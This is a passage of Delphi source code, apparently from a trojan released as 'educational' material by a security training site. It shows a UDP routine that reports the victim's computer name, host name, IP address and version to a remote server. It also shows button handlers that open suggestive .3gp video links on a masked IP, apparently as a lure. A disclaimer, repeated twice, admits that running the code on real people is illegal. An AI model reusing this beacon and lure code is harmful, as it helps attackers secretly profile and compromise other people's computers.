        myip:= UDPClient1.LocalHostAddress;
        UDPClient1.Write(thecomputername + ' | '+  myhost +' | ' + serverversion +' | '+ myip +' | '+ version1);
      end;
    end;


    end;



    timer2.Enabled:=false;
    timer5.Enabled:=true;
    end;
  {end}

{*
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before doing anything with this code

'Disclaimer: This is illegal if excuted on real people and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education pupose only.
'For more educational source codes please visit us http://www.digi77.com/training.html
'Dr Jeeni Founder of www.oman0.net & www.digi77.com wishes you good luck :).

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
}

procedure TForm1.Button1Click(Sender: TObject);
begin
Shellexecute(0,'open','http://xx.xx.xx.xx/hot/barjes.3gp','','',sw_shownormal);

end;

procedure TForm1.Button2Click(Sender: TObject);
begin
Shellexecute(0,'open','http://xx.xx.xx.xx/hot/da3sa.3gp','','',sw_shownormal);

end;

procedure TForm1.Button3Click(Sender: TObject);
begin
Shellexecute(0,'open','http://xx.xx.xx.xx/hot/qataria.3gp','','',sw_shownormal);

end;

procedure TForm1.Button4Click(Sender: TObject);
begin
Shellexecute(0,'open','http://xx.xx.xx.xx/hot/ma-abee.3gp','','',sw_shownormal);

end;

procedure TForm1.Button5Click(Sender: TObject);
begin
Shellexecute(0,'open','http://xx.xx.xx.xx/hot/q6eef.3gp','','',sw_shownormal);

end;

procedure TForm1.Button6Click(Sender: TObject);
begin
Shellexecute(0,'open','http://www.real.com/freeplayer/?rppr=downloadcom','','',sw_shownormal);

end;
    {*
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before doing anything with this code

'Disclaimer: This is illegal if excuted on real people and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education pupose only.
'For more educational source codes please visit us http://www.digi77.com/training.html
'Dr Jeeni Founder of www.oman0.net & www.digi77.com wishes you good luck :).

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
}
end.
